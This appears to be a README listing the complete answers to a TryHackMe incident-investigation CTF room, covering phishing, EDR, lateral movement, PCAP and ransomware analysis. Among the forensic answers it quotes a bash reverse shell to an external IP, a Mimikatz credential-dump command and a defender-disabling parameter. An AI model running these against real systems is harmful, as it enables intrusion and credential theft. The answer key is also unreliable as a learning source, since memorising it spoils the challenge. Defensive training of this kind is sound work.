# <img src="https://tryhackme-images.s3.amazonaws.com/room-icons/678ecc92c80aa206339f0f23-1765566441707" alt="First Shift CTF Logo" style="vertical-align: middle; height: 50px;" /> First Shift CTF  

![First Shift CTF Banner](https://tryhackme-images.s3.eu-west-1.amazonaws.com/room-icons/678ecc92c80aa206339f0f23-1765566600342)

 
**Room:**    > [First Shift CTF](https://tryhackme.com/room/first-shift-ctf) 

## 📌 Overview
This repository contains the full  solutions for the **First Shift CTF** room on TryHackMe. 
This challenge simulates a real-world security incident investigation, covering Threat Intelligence, Phishing, EDR analysis, and Lateral Movement.

---

## 📑 Table of Contents
* [1. Meet ProbablyFine](#1)
* [2. Probably Just Fine](#2)
* [3. Phishing Books](#3)
* [4. Portal Drop](#4)
* [5. Zero Tolerance](#5)
* [6. The Crown Jewel](#6)
* [7. Promotion Night](#7)

---
 

## 🚀 1. Meet ProbablyFine
**Task:**    > Initial check-in to the event.

1. **Let's go! Your flag is:**    > **THM{first_shift_check_in!}**  
   > `THM{first_shift_check_in!}`


---

## 🔍 2. Probably Just Fine
**Focus:**    > Threat Intelligence & Malware Profiling (LummaStealer).

1. **ASN number related to the IP:**
    > `212238`
2. **Service offered from this IP:**
    > `vpn`
3. **Filename related to the hash:**
    > `zY9sqWs.exe`
4. **Threat signature (Microsoft):*
*    > `Trojan:Win32/LummaStealer.PM!MTB`
5. **Domains linked to the same campaign:**
    > `151`
6. **YARA rule condition:**
    > `uint16(0) == 0x5a4d and any of them`
7. **TI Report title:**
    > `Behind the Curtain: How Lumma Affiliates Operate`
8. **Malware author collaboration (early 2024):**
    > `GhostSocks`
9. **Android infostealer used by Mexican affiliate:**
    > `CraxsRAT`
10. **MITRE ATT&CK sub-technique (AnonRDP):**
    > `T1583.003`

---

## 📧 3. Phishing Books
**Focus:**    > Email Analysis & Obfuscation.

1. **Header check explaining filter bypass:**
    > `DMARC=none`
2. **Technique to make message seem legitimate:**
    > `Typosquatting`
3. **MITRE ID for sender address trick:**
    > `T1583.001`
4. **Attached file extension:**
    > `.HTML`
5. **MD5 hash of the .HTML file:**
    > `442f2965cb6e9147da7908bb4eb73a72`
6. **Landing page URL:**
    > `http://lib-service.com:8083`
7. **MITRE ID for obfuscation:**
    > `T1027`
8. **Hidden message in the file:**
    > `I love to phish books from libraries ^^`
9. **Line responsible for decoding:**
    > `var src = reversed.split("").reverse().join("");`
10. **First URL in redirect chain:**
    > `http://xn--librarytlu-13cwe32432-kwr.com:8082`
11. **Threat Actor (Adversary):**
    > `Cobalt Dickens | Silent Librarian`
12. **Main target according to MITRE:**
    > `Research and Proprietary Data`

---

## 🛡️ 4. Portal Drop
**Focus:**    > EDR Investigation & Web Exploitation.

1. **IP that initiated the brute force:**
    > `34.67.91.83`
2. **Successful and failed logins:**
    > `18, 35`
3. **User-Agent used for file upload:**
    > `python-requests/2.31.0`
4. **Suspicious uploaded file:**
    > `invoice.php`
5. **First script invocation (Timestamp):**
    > `2025-11-06 14:27:34`
6. **First decoded command:**
    > `whoami`
7. **MITRE Persistence sub-technique:**
    > `T1505.003`
8. **Process image executing commands:**
    > `/usr/sbin/php-fpm7.4`
9. **Bash reverse shell command:**
    > `bash -i >& /dev/tcp/115.58.148.86/8080 0>&1`
10. **Linux user context:**
    > `www-data`
11. **Accessed CRM config file:**
    > `/etc/trycrm/config.json`
12. **Exfiltration domain:** 
   > `portaldrop2025.xyz`
13. **Final Task Flag:**
    > `THM{p0rtal_dropp3d?}`

---

## ☣️ 5. Zero Tolerance
**Focus:**    > Beachhead Analysis & Lateral Movement.

1. **Hostname of initial access:**
    > `JP-BROWN-WS`
2. **MITRE ID for initial code execution:**
    > `T1204.002`
3. **Full path of malicious file:**
    > `C:\Users\jp.brown\Downloads\TravisClart_Resume.pdf.lnk`
4. **LOLBin abused (mshta):**
    > `C:\Windows\System32\mshta.exe`
5. **Attacker C2 IP:**
    > `10.10.14.174`
6. **C2 beaconing process path:**
    > `C:\Windows\Temp\RuntimeBroker.exe`
7. **Persistence path (Registry):**
    > `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SystemMonitor`
8. **Tool used for cred dumping:**
    > `Invoke-Mimikatz -DumpCreds`
9. **Evasion parameter changed:**
    > `DisableRealtimeMonitoring`
10. **PID for remote command execution:**
    > `6612`
11. **Pivot time:**
    > `2025-11-14 05:19:42`
12. **PowerShell collection script:**
    > `C:\Windows\Temp\Setup-BackupServer.ps1`
13. **Targeted exfiltration extensions:**
    > `.bak, .backup, .sql, .mdb`
14. **Staged file path:**
    > `C:\Users\bkup-svc\AppData\Local\Temp\sysbackup_20251114.dat`

---

## 💎 6. The Crown Jewel
**Focus:**    > Network Forensics & PCAP Analysis.

1. **From which internal IP did the suspicious connection originate?**
   > `10.10.10.100`

2. **What outbound connection was detected as a C2 channel?** (Ex: 1.2.3.4:9996)
   > `1.1.1.1:8080`

3. **Which MAC address is impersonating the gateway 10.10.10.1?**
   > `00:0c:29:11:22:33`

4. **What is the non-standard User-Agent hitting the Jira instance?**
   > `CVE-202X-EXPLOIT`

5. **How many ARP spoofing attacks were observed in the PCAP?**
   > `90`

6. **What's the payload containing the plaintext creds found in the POST request?**
   > `username=dev_user&password=SecretPassword!`

7. **What domain, owned by the attacker, was used for data exfiltration?**
   > `exfil-domain.xyz`

8. **After examining the logs, which protocol was used for data exfiltration?**
   > `DNS`
---

## 🏆 7. Promotion Night
**Focus:**    > Final Compromise & AWS Exfiltration.


1. **Network share path where ransomware was placed:**
    > `\\DC-01\SYSVOL\gaze.exe`
2. **Ransomware persistence value:**
    > `BabyLockerKZ`
3. **Most likely extension of encrypted files:**
    > `.danger17`
4. **MITRE technique ID for deployment:**
    > `T1047`
5. **Successfully scanned ports of SRV-ITFS:**
    > `135, 139, 445, 3389, 5985`
6. **Full path to Discovery malware:**
    > `C:\Windows\System32\fr-FR\ruche.dll`
7. **Artifact created for persistence:**
    > `LanguageSync`
8. **MD5 hash of initial shellcode:**
    > `27B0D51406B5360B49D968D69DF0F3E6`
9. **C2 framework used:**
    > `Cobalt Strike`
10. **Hostname of adversary login:**
    > `DESKTOP-J9PR0CO`
11. **UNC path with AWS credentials:**
    > `\\SRV-ITFS\Integrations\cloud-keys.csv`
12. **Adversary IP for AWS access:**
    > `152.42.128.207`
13. **Sensitive files exfiltrated from AWS:**
    > `beta.tar.gz, latest.tar.gz`
14. **File uploaded to S3:**
    > `YOU-HAVE-BEEN-PWNED.txt`

---
